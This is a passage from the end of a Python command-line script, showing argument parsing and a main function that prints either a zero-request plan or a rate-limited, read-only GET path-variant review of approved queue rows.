    parser.add_argument("--review", action="store_true", help="Run read-only GET path-variant review for approved queue rows only")
    parser.add_argument("--delay", type=float, default=3.0)
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    if args.plan:
        print(json.dumps(run_plan(args.run_dir), ensure_ascii=False, indent=2))
        return 0
    if args.review:
        print(json.dumps(run_review(args.run_dir, args.delay, args.timeout), ensure_ascii=False, indent=2))
        return 0
    # Default: plan only (zero requests).
    print(json.dumps(run_plan(args.run_dir), ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
